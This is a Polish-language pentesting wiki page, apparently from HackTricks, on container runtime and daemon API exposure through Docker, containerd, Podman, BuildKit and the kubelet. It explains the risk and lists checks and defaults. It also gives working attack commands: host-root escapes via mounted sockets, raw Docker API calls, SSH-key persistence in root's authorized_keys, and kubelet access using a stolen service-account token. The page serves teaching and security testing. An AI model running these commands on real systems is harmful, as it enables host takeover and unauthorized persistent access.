# Ekspozycja API środowiska uruchomieniowego i demona

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Wiele rzeczywistych przypadków przejęcia kontenerów wcale nie zaczyna się od ucieczki z namespace. Zaczynają się od dostępu do płaszczyzny sterowania środowiskiem uruchomieniowym. Jeśli workload może komunikować się z `dockerd`, `containerd`, CRI-O, Podmanem lub kubeletem przez podmontowany socket Unix albo wystawiony listener TCP, atakujący może zażądać uruchomienia nowego kontenera z większymi uprawnieniami, podmontować system plików hosta, dołączyć do namespace hosta lub uzyskać poufne informacje o węźle. W takich przypadkach rzeczywistą granicą bezpieczeństwa jest API środowiska uruchomieniowego, a jego przejęcie jest w praktyce niemal równoznaczne z przejęciem hosta.

Dlatego ekspozycję socketu środowiska uruchomieniowego należy dokumentować niezależnie od zabezpieczeń jądra. Kontener ze standardowymi ustawieniami seccomp, capabilities i ochroną MAC może nadal dzielić go od przejęcia hosta jedno wywołanie API, jeśli zamontowano w nim `/var/run/docker.sock` lub `/run/containerd/containerd.sock`. Izolacja jądra bieżącego kontenera może działać dokładnie zgodnie z założeniami, podczas gdy płaszczyzna zarządzania środowiskiem uruchomieniowym pozostaje całkowicie odsłonięta.

## Modele dostępu do demona

Docker Engine tradycyjnie udostępnia swoje uprzywilejowane API przez lokalny socket Unix `unix:///var/run/docker.sock`. Historycznie udostępniano je również zdalnie przez listenery TCP, takie jak `tcp://0.0.0.0:2375`, lub przez listener zabezpieczony TLS na porcie `2376`. Zdalne udostępnienie demona bez silnego TLS i uwierzytelniania klienta w praktyce zamienia Docker API w zdalny interfejs root.

containerd, CRI-O, Podman i kubelet udostępniają podobne powierzchnie o dużym wpływie. Różnią się nazwami i sposobem działania, ale nie zasadą. Jeśli interfejs pozwala wywołującemu tworzyć workloady, montować ścieżki hosta, pobierać poświadczenia lub modyfikować działające kontenery, jest uprzywilejowanym kanałem zarządzania i należy go odpowiednio traktować.

Internetowy interfejs zarządzania kontenerami może odsłaniać tę samą granicę, nawet jeśli lokalne konto nie ma bezpośredniego dostępu do socketu. Na przykład [Portainer issue #493](https://github.com/portainer/portainer/issues/493) opisywał możliwość zresetowania hasła administratora bez uwierzytelnienia w starszej wersji 1.11.1. Traktuj UI dostępne lokalnie wyłącznie jako wskazówkę do dalszej weryfikacji: potwierdź zainstalowaną wersję i sposób uwierzytelniania, rzeczywisty zakres uprawnień administratora oraz to, czy zarządzany endpoint może tworzyć kontenery z zapisywalnym bind mountem hosta. [Dokumentacja Portainer](https://docs.portainer.io/admin/environments/add/docker/socket) wskazuje, że zarządzanie oparte na sockecie wymaga dostępu do socketu Docker; endpoint rootless lub z ograniczeniami zmienia wpływ na hosta. Nie wyciągaj wniosków o luce w uwierzytelnianiu ani dostępie root do hosta wyłącznie na podstawie nazwy procesu, portu lub ciągu wersji.

Typowe lokalne ścieżki, które warto sprawdzić, to:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Starsze lub bardziej wyspecjalizowane stosy mogą również udostępniać endpointy, takie jak `dockershim.sock`, `frakti.sock` lub `rktlet.sock`. Są one rzadsze we współczesnych środowiskach, ale jeśli się na nie natkniesz, należy zachować taką samą ostrożność, ponieważ stanowią interfejsy kontroli runtime’u, a nie zwykłe sockety aplikacji.

## Bezpieczny dostęp zdalny

Jeśli daemon musi być dostępny spoza lokalnego socketu, połączenie należy zabezpieczyć za pomocą TLS, najlepiej z wzajemnym uwierzytelnianiem, tak aby daemon weryfikował klienta, a klient — daemon. Stary zwyczaj udostępniania daemona Docker przez zwykły HTTP dla wygody jest jednym z najniebezpieczniejszych błędów w administracji kontenerami, ponieważ API zapewnia wystarczające uprawnienia, by bezpośrednio tworzyć uprzywilejowane kontenery.

Historyczna konfiguracja Docker wyglądała następująco:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Na hostach opartych na systemd komunikacja z daemonem może również używać `fd://`, co oznacza, że proces dziedziczy wcześniej otwarte gniazdo od systemd, zamiast samodzielnie go wiązać. Ważna jest nie dokładna składnia, lecz konsekwencje dla bezpieczeństwa. Gdy tylko daemon nasłuchuje poza lokalnym gniazdem z restrykcyjnymi uprawnieniami, zabezpieczenia transportu i uwierzytelnianie klientów stają się koniecznością, a nie opcjonalnym wzmocnieniem zabezpieczeń.

## Nadużycia

Jeśli dostępne jest gniazdo runtime, ustal, które to gniazdo, czy istnieje zgodny klient oraz czy możliwy jest bezpośredni dostęp przez HTTP lub gRPC:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Te polecenia są przydatne, ponieważ pozwalają odróżnić nieistniejącą ścieżkę, zamontowany, ale niedostępny socket oraz działające API z uprawnieniami. Jeśli klient działa, kolejne pytanie brzmi, czy API może uruchomić nowy kontener z bind mountem hosta lub współdzieleniem przestrzeni nazw hosta.

### Gdy nie zainstalowano klienta

Brak `docker`, `podman` lub innego wygodnego CLI nie oznacza, że socket jest bezpieczny. Docker Engine komunikuje się przez HTTP za pośrednictwem swojego socketu Unix, a Podman udostępnia zarówno API zgodne z Dockerem, jak i natywne API Libpod przez `podman system service`. Oznacza to, że do sterowania demonem może wystarczyć minimalne środowisko wyposażone tylko w `curl`:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Ma to znaczenie podczas post-exploitation, ponieważ obrońcy czasami usuwają standardowe pliki binarne klienta, ale pozostawiają podmontowane gniazdo zarządzania. Na hostach Podman pamiętaj, że ścieżka o wysokiej wartości różni się w zależności od wdrożenia rootful lub rootless: `unix:///run/podman/podman.sock` dla instancji usługi rootful oraz `unix://$XDG_RUNTIME_DIR/podman/podman.sock` dla instancji rootless.

### Pełny przykład: od gniazda Docker do uprawnień roota na hoście

Jeśli `docker.sock` jest osiągalne, klasyczna metoda ucieczki polega na uruchomieniu nowego kontenera, który podmontowuje główny system plików hosta, a następnie wykonaniu w nim `chroot`:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Zapewnia to bezpośrednie wykonanie poleceń z uprawnieniami roota hosta za pośrednictwem demona Docker. Skutki nie ograniczają się do odczytu plików. Po wejściu do nowego kontenera atakujący może modyfikować pliki hosta, pozyskiwać dane uwierzytelniające, instalować mechanizmy trwałego dostępu lub uruchamiać dodatkowe uprzywilejowane obciążenia.

### Pełny przykład: gniazdo Docker a przestrzenie nazw hosta

Jeśli atakujący woli wejść do przestrzeni nazw zamiast uzyskiwać dostęp wyłącznie do systemu plików:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Ta ścieżka prowadzi do hosta, prosząc runtime o utworzenie nowego kontenera z jawnym udostępnieniem przestrzeni nazw hosta, zamiast wykorzystywać bieżący kontener.

### Wzorzec persistence przez Docker Socket

Kontrolę nad runtime można też wykorzystać do utrzymania dostępu, zamiast uruchamiać jednorazową powłokę. Ogólny schemat polega na utworzeniu kontenera pomocniczego z montowaniem hosta, zapisaniu materiału umożliwiającego autoryzowany dostęp lub hooka startowego w zamontowanym systemie plików hosta, a następnie sprawdzeniu, czy host z niego korzysta.

Przykładowy schemat:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Ten sam pomysł można zastosować do jednostek systemd, fragmentów cron, plików startowych aplikacji lub kluczy SSH, zależnie od tego, co operator chce wykazać. Najważniejsze jest to, że trwała zmiana jest wprowadzana za pośrednictwem uprawnień demona runtime do systemu plików hosta, a nie dzięki dodatkowym uprawnieniom w pierwotnym kontenerze.

### Raw Docker API Helper Pivot

Gdy brakuje Docker CLI, ten sam przepływ z helperem i montowaniem hosta można zrealizować przez HTTP za pośrednictwem gniazda Unix. Ogólny przebieg wygląda następująco: potwierdź dostępność API, utwórz kontener pomocniczy z montowaniem bind hosta, uruchom go, utwórz instancję exec, a następnie ją uruchom.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Końcowe żądanie `/exec/<id>/start` zależy od zwróconego exec ID, ale kwestia bezpieczeństwa nie zależy od dokładnej mechaniki JSON: bezpośredni dostęp przez API do demona Docker działającego z uprawnieniami root wystarczy, by zażądać uruchomienia bardziej uprzywilejowanego zadania pomocniczego.

### Pełny przykład: socket containerd

Zamontowany socket `containerd` jest zwykle równie niebezpieczny:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Jeśli dostępny jest klient bardziej podobny do Dockera, `nerdctl` może być wygodniejszy niż `ctr`, ponieważ udostępnia znane flagi, takie jak `--privileged`, `--pid=host` i `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Wpływ to ponownie kompromitacja hosta. Nawet jeśli brakuje narzędzi specyficznych dla Dockera, inne API runtime’u może nadal zapewniać taką samą władzę administracyjną. Węzły Kubernetes można też rozpoznawać i wchodzić w interakcje z kontenerami za pomocą `crictl`, ponieważ komunikuje się bezpośrednio z endpointem CRI.

### Gniazdo BuildKit

`buildkitd` łatwo przeoczyć, ponieważ wiele osób uważa go za „tylko backend do buildów”, ale demon nadal stanowi uprzywilejowaną płaszczyznę sterowania. Dostępne `buildkitd.sock` może umożliwić napastnikowi uruchamianie dowolnych kroków builda, sprawdzanie możliwości workerów, korzystanie z lokalnych kontekstów w skompromitowanym środowisku oraz żądanie niebezpiecznych uprawnień, takich jak `network.host` lub `security.insecure`, jeśli demon został skonfigurowany tak, by na to zezwalać.

Przydatne pierwsze interakcje to:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Jeśli daemon akceptuje żądania build, sprawdź, czy dostępne są niezabezpieczone uprawnienia:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Dokładny wpływ zależy od konfiguracji demona, ale usługa BuildKit działająca z uprawnieniami roota i permissive entitlements nie jest nieszkodnym udogodnieniem dla programistów. Traktuj ją jako kolejny cenny cel administracyjny, szczególnie na runnerach CI i współdzielonych węzłach budowania.

### API kubelet przez TCP

kubelet nie jest runtime’em kontenerów, ale nadal należy do płaszczyzny zarządzania węzłem i często uwzględnia się go przy omawianiu tej samej granicy zaufania. Jeśli bezpieczny port kubeletu `10250` jest dostępny z workloadu albo ujawniono poświadczenia węzła, kubeconfigi lub uprawnienia proxy, atakujący może być w stanie wylistować Pody, pobrać logi lub wykonywać polecenia w kontenerach lokalnych dla węzła, nie przechodząc przez ścieżkę admission serwera API Kubernetes.

Zacznij od szybkiego rozpoznania:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Jeśli ścieżka proxy kubeleta lub API-servera autoryzuje `exec`, klient obsługujący WebSocket może wykorzystać to do wykonania kodu w innych kontenerach na węźle. Dlatego też `nodes/proxy` z uprawnieniem tylko do `get` jest bardziej niebezpieczne, niż mogłoby się wydawać: żądanie nadal może dotrzeć do endpointów kubeleta wykonujących polecenia, a te bezpośrednie interakcje z kubeletem nie pojawiają się w standardowych logach audytu Kubernetes.<sup>[[2]](#references)</sup>

## Sprawdzenia

Celem tych sprawdzeń jest ustalenie, czy kontener może uzyskać dostęp do jakiejkolwiek płaszczyzny zarządzania, która powinna pozostać poza granicą zaufania.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Co jest tu interesujące:

- Zamontowany socket runtime’u to zwykle bezpośredni prymityw administracyjny, a nie tylko ujawnienie informacji.
- Listener TCP na porcie `2375` bez TLS należy traktować jako warunek umożliwiający zdalne przejęcie systemu.
- Zmienne środowiskowe, takie jak `DOCKER_HOST`, często wskazują, że workload zaprojektowano celowo tak, aby komunikował się z runtime’em hosta.

## Domyślne ustawienia runtime’ów

| Runtime / platforma | Stan domyślny | Domyślne działanie | Typowe ręczne osłabienia zabezpieczeń |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie lokalny socket Unix | `dockerd` nasłuchuje na lokalnym sockecie, a daemon zwykle działa z uprawnieniami roota | montowanie `/var/run/docker.sock`, udostępnianie `tcp://...:2375`, słabe lub brakujące TLS na `2376` |
| Podman | Domyślnie CLI bez demona | Do zwykłego lokalnego użycia nie jest wymagany długo działający, uprzywilejowany daemon; sockety API mogą być jednak udostępnione po włączeniu `podman system service` | udostępnianie `podman.sock`, szeroki zakres działania usługi, użycie API z uprawnieniami roota |
| containerd | Lokalny uprzywilejowany socket | Administracyjne API jest udostępniane przez lokalny socket i zwykle używane przez narzędzia wyższego poziomu | montowanie `containerd.sock`, szeroki dostęp przez `ctr` lub `nerdctl`, udostępnianie uprzywilejowanych przestrzeni nazw |
| CRI-O | Lokalny uprzywilejowany socket | Endpoint CRI jest przeznaczony dla zaufanych komponentów działających lokalnie na węźle | montowanie `crio.sock`, udostępnianie endpointu CRI niezaufanym workloadom |
| Kubernetes kubelet | Lokalny dla węzła interfejs zarządzania | Kubelet nie powinien być szeroko dostępny z Podów; w zależności od konfiguracji uwierzytelniania i autoryzacji dostęp może ujawnić stan Podów, dane uwierzytelniające i funkcje wykonywania poleceń | montowanie socketów kubeleta lub certyfikatów, słabe uwierzytelnianie kubeleta, sieć hosta wraz z osiągalnym endpointem kubeleta |

## References

- [1] [Wykorzystywanie socketu containerd, część 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Ryzyko obejścia Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
